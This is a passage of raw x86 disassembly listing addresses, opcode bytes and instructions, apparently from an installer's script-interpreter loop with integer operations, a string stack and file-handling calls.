  4016d4:	85 c0                	test   %eax,%eax
  4016d6:	74 23                	je     0x4016fb
  4016d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4016db:	3b c6                	cmp    %esi,%eax
  4016dd:	76 25                	jbe    0x401704
  4016df:	38 18                	cmp    %bl,(%eax)
  4016e1:	74 21                	je     0x401704
  4016e3:	56                   	push   %esi
  4016e4:	e8 b3 4e 00 00       	call   0x40659c
  4016e9:	3b c3                	cmp    %ebx,%eax
  4016eb:	74 0e                	je     0x4016fb
  4016ed:	83 c0 2c             	add    $0x2c,%eax
  4016f0:	50                   	push   %eax
  4016f1:	ff 75 08             	push   0x8(%ebp)
  4016f4:	e8 2f 4b 00 00       	call   0x406228
  4016f9:	eb 09                	jmp    0x401704
  4016fb:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401702:	88 1f                	mov    %bl,(%edi)
  401704:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401707:	0f 85 4d 13 00 00    	jne    0x402a5a
  40170d:	68 00 04 00 00       	push   $0x400
  401712:	57                   	push   %edi
  401713:	57                   	push   %edi
  401714:	ff 15 04 81 40 00    	call   *0x408104
  40171a:	e9 3b 13 00 00       	jmp    0x402a5a
  40171f:	6a ff                	push   $0xffffffff
  401721:	e8 a8 14 00 00       	call   0x402bce
  401726:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401729:	51                   	push   %ecx
  40172a:	56                   	push   %esi
  40172b:	68 00 04 00 00       	push   $0x400
  401730:	53                   	push   %ebx
  401731:	50                   	push   %eax
  401732:	53                   	push   %ebx
  401733:	ff 15 14 81 40 00    	call   *0x408114
  401739:	85 c0                	test   %eax,%eax
  40173b:	0f 85 19 13 00 00    	jne    0x402a5a
  401741:	e9 4d 10 00 00       	jmp    0x402793
  401746:	6a ef                	push   $0xffffffef
  401748:	e8 81 14 00 00       	call   0x402bce
  40174d:	50                   	push   %eax
  40174e:	56                   	push   %esi
  40174f:	e8 9c 46 00 00       	call   0x405df0
  401754:	e9 55 fe ff ff       	jmp    0x4015ae
  401759:	6a 31                	push   $0x31
  40175b:	e8 6e 14 00 00       	call   0x402bce
  401760:	8b f0                	mov    %eax,%esi
  401762:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401765:	83 e0 07             	and    $0x7,%eax
  401768:	56                   	push   %esi
  401769:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40176c:	89 45 08             	mov    %eax,0x8(%ebp)
  40176f:	e8 b9 44 00 00       	call   0x405c2d
  401774:	56                   	push   %esi
  401775:	be 20 a4 40 00       	mov    $0x40a420,%esi
  40177a:	85 c0                	test   %eax,%eax
  40177c:	74 08                	je     0x401786
  40177e:	56                   	push   %esi
  40177f:	e8 a4 4a 00 00       	call   0x406228
  401784:	eb 17                	jmp    0x40179d
  401786:	68 00 a8 42 00       	push   $0x42a800
  40178b:	56                   	push   %esi
  40178c:	e8 97 4a 00 00       	call   0x406228
  401791:	50                   	push   %eax
  401792:	e8 29 44 00 00       	call   0x405bc0
  401797:	50                   	push   %eax
  401798:	e8 a7 4a 00 00       	call   0x406244
  40179d:	56                   	push   %esi
  40179e:	e8 60 4d 00 00       	call   0x406503
  4017a3:	bf 20 ac 40 00       	mov    $0x40ac20,%edi
  4017a8:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017ac:	7c 31                	jl     0x4017df
  4017ae:	56                   	push   %esi
  4017af:	e8 e8 4d 00 00       	call   0x40659c
  4017b4:	33 c9                	xor    %ecx,%ecx
  4017b6:	3b c3                	cmp    %ebx,%eax
  4017b8:	74 10                	je     0x4017ca
  4017ba:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4017bd:	83 c0 14             	add    $0x14,%eax
  4017c0:	51                   	push   %ecx
  4017c1:	50                   	push   %eax
  4017c2:	ff 15 0c 81 40 00    	call   *0x40810c
  4017c8:	8b c8                	mov    %eax,%ecx
  4017ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4017cd:	83 c0 fd             	add    $0xfffffffd,%eax
  4017d0:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017d5:	23 c1                	and    %ecx,%eax
  4017d7:	f7 d8                	neg    %eax
  4017d9:	1b c0                	sbb    %eax,%eax
  4017db:	40                   	inc    %eax
  4017dc:	89 45 08             	mov    %eax,0x8(%ebp)
  4017df:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e2:	75 06                	jne    0x4017ea
  4017e4:	56                   	push   %esi
  4017e5:	e8 b2 45 00 00       	call   0x405d9c
  4017ea:	33 c0                	xor    %eax,%eax
  4017ec:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017f0:	0f 95 c0             	setne  %al
  4017f3:	40                   	inc    %eax
  4017f4:	50                   	push   %eax
  4017f5:	68 00 00 00 40       	push   $0x40000000
  4017fa:	56                   	push   %esi
  4017fb:	e8 c1 45 00 00       	call   0x405dc1
  401800:	83 f8 ff             	cmp    $0xffffffff,%eax
  401803:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401806:	75 76                	jne    0x40187e
  401808:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40180b:	75 53                	jne    0x401860
  40180d:	68 00 50 42 00       	push   $0x425000
  401812:	57                   	push   %edi
  401813:	e8 10 4a 00 00       	call   0x406228
  401818:	56                   	push   %esi
  401819:	68 00 50 42 00       	push   $0x425000
  40181e:	e8 05 4a 00 00       	call   0x406228
  401823:	ff 75 ec             	push   -0x14(%ebp)
  401826:	68 20 a8 40 00       	push   $0x40a820
  40182b:	e8 8b 4a 00 00       	call   0x4062bb
  401830:	57                   	push   %edi
  401831:	68 00 50 42 00       	push   $0x425000
  401836:	e8 ed 49 00 00       	call   0x406228
  40183b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40183e:	c1 f8 03             	sar    $0x3,%eax
  401841:	50                   	push   %eax
  401842:	68 20 a8 40 00       	push   $0x40a820
  401847:	e8 f8 40 00 00       	call   0x405944
  40184c:	83 e8 04             	sub    $0x4,%eax
  40184f:	0f 84 53 ff ff ff    	je     0x4017a8
  401855:	48                   	dec    %eax
  401856:	74 1b                	je     0x401873
  401858:	56                   	push   %esi
  401859:	6a fa                	push   $0xfffffffa
  40185b:	e9 32 fc ff ff       	jmp    0x401492
  401860:	ff 75 f8             	push   -0x8(%ebp)
  401863:	6a e2                	push   $0xffffffe2
  401865:	e8 e5 3a 00 00       	call   0x40534f
  40186a:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40186e:	e9 3d fd ff ff       	jmp    0x4015b0
  401873:	ff 05 e8 47 42 00    	incl   0x4247e8
  401879:	e9 e5 11 00 00       	jmp    0x402a63
  40187e:	ff 75 f8             	push   -0x8(%ebp)
  401881:	6a ea                	push   $0xffffffea
  401883:	e8 c7 3a 00 00       	call   0x40534f
  401888:	ff 05 14 48 42 00    	incl   0x424814
  40188e:	53                   	push   %ebx
  40188f:	53                   	push   %ebx
  401890:	ff 75 f4             	push   -0xc(%ebp)
  401893:	ff 75 e0             	push   -0x20(%ebp)
  401896:	e8 f7 18 00 00       	call   0x403192
  40189b:	ff 0d 14 48 42 00    	decl   0x424814
  4018a1:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  4018a5:	8b f8                	mov    %eax,%edi
  4018a7:	75 06                	jne    0x4018af
  4018a9:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018ad:	74 12                	je     0x4018c1
  4018af:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018b2:	50                   	push   %eax
  4018b3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018b6:	53                   	push   %ebx
  4018b7:	50                   	push   %eax
  4018b8:	ff 75 f4             	push   -0xc(%ebp)
  4018bb:	ff 15 10 81 40 00    	call   *0x408110
  4018c1:	ff 75 f4             	push   -0xc(%ebp)
  4018c4:	ff 15 20 81 40 00    	call   *0x408120
  4018ca:	3b fb                	cmp    %ebx,%edi
  4018cc:	0f 8d 88 11 00 00    	jge    0x402a5a
  4018d2:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018d5:	75 13                	jne    0x4018ea
  4018d7:	6a e9                	push   $0xffffffe9
  4018d9:	56                   	push   %esi
  4018da:	e8 dc 49 00 00       	call   0x4062bb
  4018df:	ff 75 f8             	push   -0x8(%ebp)
  4018e2:	56                   	push   %esi
  4018e3:	e8 5c 49 00 00       	call   0x406244
  4018e8:	eb 08                	jmp    0x4018f2
  4018ea:	6a ee                	push   $0xffffffee
  4018ec:	56                   	push   %esi
  4018ed:	e8 c9 49 00 00       	call   0x4062bb
  4018f2:	68 10 00 20 00       	push   $0x200010
  4018f7:	56                   	push   %esi
  4018f8:	e9 85 0a 00 00       	jmp    0x402382
  4018fd:	53                   	push   %ebx
  4018fe:	eb 34                	jmp    0x401934
  401900:	6a 31                	push   $0x31
  401902:	e8 c7 12 00 00       	call   0x402bce
  401907:	ff 75 d8             	push   -0x28(%ebp)
  40190a:	50                   	push   %eax
  40190b:	e8 34 40 00 00       	call   0x405944
  401910:	3b c3                	cmp    %ebx,%eax
  401912:	0f 84 a7 0e 00 00    	je     0x4027bf
  401918:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40191b:	0f 84 67 01 00 00    	je     0x401a88
  401921:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  401924:	0f 85 30 11 00 00    	jne    0x402a5a
  40192a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40192d:	e9 33 11 00 00       	jmp    0x402a65
  401932:	6a f0                	push   $0xfffffff0
  401934:	e8 95 12 00 00       	call   0x402bce
  401939:	ff 75 dc             	push   -0x24(%ebp)
  40193c:	50                   	push   %eax
  40193d:	e8 ae 40 00 00       	call   0x4059f0
  401942:	e9 13 11 00 00       	jmp    0x402a5a
  401947:	6a 01                	push   $0x1
  401949:	e8 80 12 00 00       	call   0x402bce
  40194e:	50                   	push   %eax
  40194f:	e8 ea 48 00 00       	call   0x40623e
  401954:	e9 c7 0c 00 00       	jmp    0x402620
  401959:	6a 02                	push   $0x2
  40195b:	e8 4c 12 00 00       	call   0x402bac
  401960:	6a 03                	push   $0x3
  401962:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401965:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401968:	e8 3f 12 00 00       	call   0x402bac
  40196d:	59                   	pop    %ecx
  40196e:	8b f8                	mov    %eax,%edi
  401970:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401973:	59                   	pop    %ecx
  401974:	6a 01                	push   $0x1
  401976:	89 7d 84             	mov    %edi,-0x7c(%ebp)
  401979:	89 55 88             	mov    %edx,-0x78(%ebp)
  40197c:	89 45 08             	mov    %eax,0x8(%ebp)
  40197f:	e8 4a 12 00 00       	call   0x402bce
  401984:	50                   	push   %eax
  401985:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401988:	e8 b1 48 00 00       	call   0x40623e
  40198d:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401990:	88 1e                	mov    %bl,(%esi)
  401992:	75 03                	jne    0x401997
  401994:	89 45 08             	mov    %eax,0x8(%ebp)
  401997:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40199a:	0f 84 ba 10 00 00    	je     0x402a5a
  4019a0:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  4019a3:	3b cb                	cmp    %ebx,%ecx
  4019a5:	7d 0b                	jge    0x4019b2
  4019a7:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019aa:	3b fb                	cmp    %ebx,%edi
  4019ac:	0f 8c a8 10 00 00    	jl     0x402a5a
  4019b2:	3b f8                	cmp    %eax,%edi
  4019b4:	7e 02                	jle    0x4019b8
  4019b6:	8b f8                	mov    %eax,%edi
  4019b8:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4019bb:	03 c7                	add    %edi,%eax
  4019bd:	50                   	push   %eax
  4019be:	56                   	push   %esi
  4019bf:	e8 64 48 00 00       	call   0x406228
  4019c4:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019c7:	7d 0e                	jge    0x4019d7
  4019c9:	56                   	push   %esi
  4019ca:	e8 6f 48 00 00       	call   0x40623e
  4019cf:	01 45 08             	add    %eax,0x8(%ebp)
  4019d2:	79 03                	jns    0x4019d7
  4019d4:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4019da:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019df:	0f 8d 75 10 00 00    	jge    0x402a5a
  4019e5:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  4019e8:	e9 6d 10 00 00       	jmp    0x402a5a
  4019ed:	6a 20                	push   $0x20
  4019ef:	e8 da 11 00 00       	call   0x402bce
  4019f4:	6a 31                	push   $0x31
  4019f6:	8b f0                	mov    %eax,%esi
  4019f8:	e8 d1 11 00 00       	call   0x402bce
  4019fd:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401a00:	50                   	push   %eax
  401a01:	56                   	push   %esi
  401a02:	75 12                	jne    0x401a16
  401a04:	ff 15 18 81 40 00    	call   *0x408118
  401a0a:	85 c0                	test   %eax,%eax
  401a0c:	75 7a                	jne    0x401a88
  401a0e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a11:	e9 4f 10 00 00       	jmp    0x402a65
  401a16:	ff 15 1c 81 40 00    	call   *0x40811c
  401a1c:	eb ec                	jmp    0x401a0a
  401a1e:	33 ff                	xor    %edi,%edi
  401a20:	47                   	inc    %edi
  401a21:	57                   	push   %edi
  401a22:	e8 a7 11 00 00       	call   0x402bce
  401a27:	68 00 04 00 00       	push   $0x400
  401a2c:	56                   	push   %esi
  401a2d:	50                   	push   %eax
  401a2e:	89 45 08             	mov    %eax,0x8(%ebp)
  401a31:	ff 15 2c 81 40 00    	call   *0x40812c
  401a37:	85 c0                	test   %eax,%eax
  401a39:	74 13                	je     0x401a4e
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	74 13                	je     0x401a53
  401a40:	56                   	push   %esi
  401a41:	ff 75 08             	push   0x8(%ebp)
  401a44:	ff 15 1c 81 40 00    	call   *0x40811c
  401a4a:	85 c0                	test   %eax,%eax
  401a4c:	75 05                	jne    0x401a53
  401a4e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a51:	88 1e                	mov    %bl,(%esi)
  401a53:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a59:	e9 fc 0f 00 00       	jmp    0x402a5a
  401a5e:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401a61:	53                   	push   %ebx
  401a62:	e8 45 11 00 00       	call   0x402bac
  401a67:	6a 01                	push   $0x1
  401a69:	8b f8                	mov    %eax,%edi
  401a6b:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401a6e:	e8 39 11 00 00       	call   0x402bac
  401a73:	59                   	pop    %ecx
  401a74:	3b f3                	cmp    %ebx,%esi
  401a76:	59                   	pop    %ecx
  401a77:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401a7a:	75 08                	jne    0x401a84
  401a7c:	3b f8                	cmp    %eax,%edi
  401a7e:	7c 08                	jl     0x401a88
  401a80:	7e 8c                	jle    0x401a0e
  401a82:	eb 12                	jmp    0x401a96
  401a84:	3b f8                	cmp    %eax,%edi
  401a86:	73 08                	jae    0x401a90
  401a88:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a8b:	e9 d5 0f 00 00       	jmp    0x402a65
  401a90:	0f 86 78 ff ff ff    	jbe    0x401a0e
  401a96:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a99:	e9 c7 0f 00 00       	jmp    0x402a65
  401a9e:	6a 01                	push   $0x1
  401aa0:	e8 07 11 00 00       	call   0x402bac
  401aa5:	8b f8                	mov    %eax,%edi
  401aa7:	6a 02                	push   $0x2
  401aa9:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401aac:	89 7d 08             	mov    %edi,0x8(%ebp)
  401aaf:	e8 f8 10 00 00       	call   0x402bac
  401ab4:	59                   	pop    %ecx
  401ab5:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ab8:	59                   	pop    %ecx
  401ab9:	8b c8                	mov    %eax,%ecx
  401abb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401abe:	83 f8 0d             	cmp    $0xd,%eax
  401ac1:	0f 87 94 00 00 00    	ja     0x401b5b
  401ac7:	ff 24 85 74 2b 40 00 	jmp    *0x402b74(,%eax,4)
  401ace:	03 f9                	add    %ecx,%edi
  401ad0:	e9 5a 03 00 00       	jmp    0x401e2f
  401ad5:	2b f9                	sub    %ecx,%edi
  401ad7:	e9 53 03 00 00       	jmp    0x401e2f
  401adc:	0f af cf             	imul   %edi,%ecx
  401adf:	eb 1a                	jmp    0x401afb
  401ae1:	3b cb                	cmp    %ebx,%ecx
  401ae3:	74 53                	je     0x401b38
  401ae5:	8b c7                	mov    %edi,%eax
  401ae7:	99                   	cltd
  401ae8:	f7 f9                	idiv   %ecx
  401aea:	8b f8                	mov    %eax,%edi
  401aec:	e9 3e 03 00 00       	jmp    0x401e2f
  401af1:	0b cf                	or     %edi,%ecx
  401af3:	eb 06                	jmp    0x401afb
  401af5:	23 cf                	and    %edi,%ecx
  401af7:	eb 02                	jmp    0x401afb
  401af9:	33 cf                	xor    %edi,%ecx
  401afb:	8b f9                	mov    %ecx,%edi
  401afd:	e9 2d 03 00 00       	jmp    0x401e2f
  401b02:	33 c0                	xor    %eax,%eax
  401b04:	3b fb                	cmp    %ebx,%edi
  401b06:	0f 94 c0             	sete   %al
  401b09:	eb df                	jmp    0x401aea
  401b0b:	3b fb                	cmp    %ebx,%edi
  401b0d:	75 11                	jne    0x401b20
  401b0f:	eb 0b                	jmp    0x401b1c
  401b11:	33 ff                	xor    %edi,%edi
  401b13:	e9 17 03 00 00       	jmp    0x401e2f
  401b18:	3b fb                	cmp    %ebx,%edi
  401b1a:	74 f5                	je     0x401b11
  401b1c:	3b cb                	cmp    %ebx,%ecx
  401b1e:	74 f1                	je     0x401b11
  401b20:	33 ff                	xor    %edi,%edi
  401b22:	47                   	inc    %edi
  401b23:	e9 07 03 00 00       	jmp    0x401e2f
  401b28:	3b cb                	cmp    %ebx,%ecx
  401b2a:	74 0c                	je     0x401b38
  401b2c:	8b c7                	mov    %edi,%eax
  401b2e:	99                   	cltd
  401b2f:	f7 f9                	idiv   %ecx
  401b31:	8b fa                	mov    %edx,%edi
  401b33:	e9 f7 02 00 00       	jmp    0x401e2f
  401b38:	33 ff                	xor    %edi,%edi
  401b3a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b41:	e9 e9 02 00 00       	jmp    0x401e2f
  401b46:	d3 e7                	shl    %cl,%edi
  401b48:	e9 e2 02 00 00       	jmp    0x401e2f
  401b4d:	d3 ff                	sar    %cl,%edi
  401b4f:	e9 db 02 00 00       	jmp    0x401e2f
  401b54:	d3 ef                	shr    %cl,%edi
  401b56:	e9 d4 02 00 00       	jmp    0x401e2f
  401b5b:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b5e:	e9 cc 02 00 00       	jmp    0x401e2f
  401b63:	6a 01                	push   $0x1
  401b65:	e8 64 10 00 00       	call   0x402bce
  401b6a:	6a 02                	push   $0x2
  401b6c:	8b f8                	mov    %eax,%edi
  401b6e:	e8 39 10 00 00       	call   0x402bac
  401b73:	50                   	push   %eax
  401b74:	57                   	push   %edi
  401b75:	56                   	push   %esi
  401b76:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401b79:	ff 15 34 82 40 00    	call   *0x408234
  401b7f:	83 c4 10             	add    $0x10,%esp
  401b82:	e9 d3 0e 00 00       	jmp    0x402a5a
  401b87:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b8a:	8b 3d 60 b8 40 00    	mov    0x40b860,%edi
  401b90:	3b c3                	cmp    %ebx,%eax
  401b92:	74 44                	je     0x401bd8
  401b94:	48                   	dec    %eax
  401b95:	3b fb                	cmp    %ebx,%edi
  401b97:	0f 84 d7 07 00 00    	je     0x402374
  401b9d:	8b 3f                	mov    (%edi),%edi
  401b9f:	3b c3                	cmp    %ebx,%eax
  401ba1:	75 f1                	jne    0x401b94
  401ba3:	3b fb                	cmp    %ebx,%edi
  401ba5:	0f 84 c9 07 00 00    	je     0x402374
  401bab:	83 c7 04             	add    $0x4,%edi
  401bae:	be 20 a4 40 00       	mov    $0x40a420,%esi
  401bb3:	57                   	push   %edi
  401bb4:	56                   	push   %esi
  401bb5:	e8 6e 46 00 00       	call   0x406228
  401bba:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401bbf:	83 c0 04             	add    $0x4,%eax
  401bc2:	50                   	push   %eax
  401bc3:	57                   	push   %edi
  401bc4:	e8 5f 46 00 00       	call   0x406228
  401bc9:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401bce:	56                   	push   %esi
  401bcf:	83 c0 04             	add    $0x4,%eax
  401bd2:	50                   	push   %eax
  401bd3:	e9 40 0d 00 00       	jmp    0x402918
  401bd8:	3b d3                	cmp    %ebx,%edx
  401bda:	74 25                	je     0x401c01
  401bdc:	3b fb                	cmp    %ebx,%edi
  401bde:	0f 84 db 0b 00 00    	je     0x4027bf
  401be4:	8d 47 04             	lea    0x4(%edi),%eax
  401be7:	50                   	push   %eax
  401be8:	56                   	push   %esi
  401be9:	e8 3a 46 00 00       	call   0x406228
  401bee:	8b 07                	mov    (%edi),%eax
  401bf0:	57                   	push   %edi
  401bf1:	a3 60 b8 40 00       	mov    %eax,0x40b860
  401bf6:	ff 15 24 81 40 00    	call   *0x408124
  401bfc:	e9 59 0e 00 00       	jmp    0x402a5a
  401c01:	68 04 04 00 00       	push   $0x404
  401c06:	6a 40                	push   $0x40
  401c08:	ff 15 28 81 40 00    	call   *0x408128
  401c0e:	ff 75 d8             	push   -0x28(%ebp)
  401c11:	8b f0                	mov    %eax,%esi
  401c13:	8d 46 04             	lea    0x4(%esi),%eax
  401c16:	50                   	push   %eax
  401c17:	e8 9f 46 00 00       	call   0x4062bb
  401c1c:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401c21:	89 06                	mov    %eax,(%esi)
  401c23:	89 35 60 b8 40 00    	mov    %esi,0x40b860
  401c29:	e9 2c 0e 00 00       	jmp    0x402a5a
  401c2e:	6a 03                	push   $0x3
  401c30:	e8 77 0f 00 00       	call   0x402bac
  401c35:	6a 04                	push   $0x4
  401c37:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c3a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c3d:	e8 6a 0f 00 00       	call   0x402bac
  401c42:	f6 45 ec 01          	testb  $0x1,-0x14(%ebp)
  401c46:	59                   	pop    %ecx
  401c47:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c4a:	59                   	pop    %ecx
  401c4b:	89 45 08             	mov    %eax,0x8(%ebp)
  401c4e:	74 0a                	je     0x401c5a
  401c50:	6a 33                	push   $0x33
  401c52:	e8 77 0f 00 00       	call   0x402bce
  401c57:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c5a:	f6 45 ec 02          	testb  $0x2,-0x14(%ebp)
  401c5e:	74 0a                	je     0x401c6a
  401c60:	6a 44                	push   $0x44
  401c62:	e8 67 0f 00 00       	call   0x402bce
  401c67:	89 45 08             	mov    %eax,0x8(%ebp)
  401c6a:	83 7d d4 21          	cmpl   $0x21,-0x2c(%ebp)
  401c6e:	6a 01                	push   $0x1
  401c70:	75 4c                	jne    0x401cbe
  401c72:	e8 35 0f 00 00       	call   0x402bac
  401c77:	6a 02                	push   $0x2
  401c79:	8b f8                	mov    %eax,%edi
  401c7b:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c7e:	e8 29 0f 00 00       	call   0x402bac
  401c83:	59                   	pop    %ecx
  401c84:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401c8b:	c1 f9 02             	sar    $0x2,%ecx
  401c8e:	74 1e                	je     0x401cae
  401c90:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401c93:	52                   	push   %edx
  401c94:	51                   	push   %ecx
  401c95:	53                   	push   %ebx
  401c96:	ff 75 08             	push   0x8(%ebp)
  401c99:	ff 75 f8             	push   -0x8(%ebp)
  401c9c:	50                   	push   %eax
  401c9d:	57                   	push   %edi
  401c9e:	ff 15 2c 82 40 00    	call   *0x40822c
  401ca4:	f7 d8                	neg    %eax
  401ca6:	1b c0                	sbb    %eax,%eax
  401ca8:	40                   	inc    %eax
  401ca9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401cac:	eb 3f                	jmp    0x401ced
  401cae:	ff 75 08             	push   0x8(%ebp)
  401cb1:	ff 75 f8             	push   -0x8(%ebp)
  401cb4:	50                   	push   %eax
  401cb5:	57                   	push   %edi
  401cb6:	ff 15 60 82 40 00    	call   *0x408260
  401cbc:	eb 2c                	jmp    0x401cea
  401cbe:	e8 0b 0f 00 00       	call   0x402bce
  401cc3:	6a 12                	push   $0x12
  401cc5:	8b f8                	mov    %eax,%edi
  401cc7:	e8 02 0f 00 00       	call   0x402bce
  401ccc:	8a 08                	mov    (%eax),%cl
  401cce:	f6 d9                	neg    %cl
  401cd0:	1b c9                	sbb    %ecx,%ecx
  401cd2:	23 c8                	and    %eax,%ecx
  401cd4:	8a 07                	mov    (%edi),%al
  401cd6:	f6 d8                	neg    %al
  401cd8:	1b c0                	sbb    %eax,%eax
  401cda:	51                   	push   %ecx
  401cdb:	23 c7                	and    %edi,%eax
  401cdd:	50                   	push   %eax
  401cde:	ff 75 08             	push   0x8(%ebp)
  401ce1:	ff 75 f8             	push   -0x8(%ebp)
  401ce4:	ff 15 3c 82 40 00    	call   *0x40823c
  401cea:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401ced:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401cf0:	0f 8c 64 0d 00 00    	jl     0x402a5a
  401cf6:	ff 75 f4             	push   -0xc(%ebp)
  401cf9:	e9 6b f8 ff ff       	jmp    0x401569
  401cfe:	53                   	push   %ebx
  401cff:	e8 a8 0e 00 00       	call   0x402bac
  401d04:	59                   	pop    %ecx
  401d05:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d08:	50                   	push   %eax
  401d09:	ff 15 40 82 40 00    	call   *0x408240
  401d0f:	85 c0                	test   %eax,%eax
  401d11:	0f 84 f7 fc ff ff    	je     0x401a0e
  401d17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401d1a:	e9 46 0d 00 00       	jmp    0x402a65
  401d1f:	6a 02                	push   $0x2
  401d21:	e8 86 0e 00 00       	call   0x402bac
  401d26:	6a 01                	push   $0x1
  401d28:	8b f8                	mov    %eax,%edi
  401d2a:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d2d:	e8 7a 0e 00 00       	call   0x402bac
  401d32:	59                   	pop    %ecx
  401d33:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d36:	59                   	pop    %ecx
  401d37:	57                   	push   %edi
  401d38:	50                   	push   %eax
  401d39:	ff 15 38 82 40 00    	call   *0x408238
  401d3f:	e9 dc 08 00 00       	jmp    0x402620
  401d44:	a1 a8 47 42 00       	mov    0x4247a8,%eax
  401d49:	53                   	push   %ebx
  401d4a:	8d 34 10             	lea    (%eax,%edx,1),%esi
  401d4d:	e8 5a 0e 00 00       	call   0x402bac
  401d52:	59                   	pop    %ecx
  401d53:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d56:	56                   	push   %esi
  401d57:	6a eb                	push   $0xffffffeb
  401d59:	50                   	push   %eax
  401d5a:	ff 15 48 82 40 00    	call   *0x408248
  401d60:	e9 f5 0c 00 00       	jmp    0x402a5a
  401d65:	f6 45 e5 01          	testb  $0x1,-0x1b(%ebp)
  401d69:	74 0d                	je     0x401d78
  401d6b:	6a 02                	push   $0x2
  401d6d:	e8 3a 0e 00 00       	call   0x402bac
  401d72:	59                   	pop    %ecx
  401d73:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d76:	eb 0c                	jmp    0x401d84
  401d78:	ff 75 e0             	push   -0x20(%ebp)
  401d7b:	ff 75 f8             	push   -0x8(%ebp)
  401d7e:	ff 15 38 82 40 00    	call   *0x408238
  401d84:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401d87:	89 45 08             	mov    %eax,0x8(%ebp)
  401d8a:	8b c1                	mov    %ecx,%eax
  401d8c:	8b f9                	mov    %ecx,%edi
  401d8e:	83 e0 03             	and    $0x3,%eax
  401d91:	83 e7 04             	and    $0x4,%edi
  401d94:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d97:	8b c1                	mov    %ecx,%eax
  401d99:	c1 e8 1f             	shr    $0x1f,%eax
  401d9c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401d9f:	8b c1                	mov    %ecx,%eax
  401da1:	c1 e8 1e             	shr    $0x1e,%eax
  401da4:	83 e0 01             	and    $0x1,%eax
  401da7:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401dad:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401db0:	74 09                	je     0x401dbb
  401db2:	6a 11                	push   $0x11
  401db4:	e8 15 0e 00 00       	call   0x402bce
  401db9:	eb 04                	jmp    0x401dbf
  401dbb:	0f b7 45 dc          	movzwl -0x24(%ebp),%eax
  401dbf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401dc2:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401dc8:	50                   	push   %eax
  401dc9:	ff 75 08             	push   0x8(%ebp)
  401dcc:	ff 15 6c 82 40 00    	call   *0x40826c
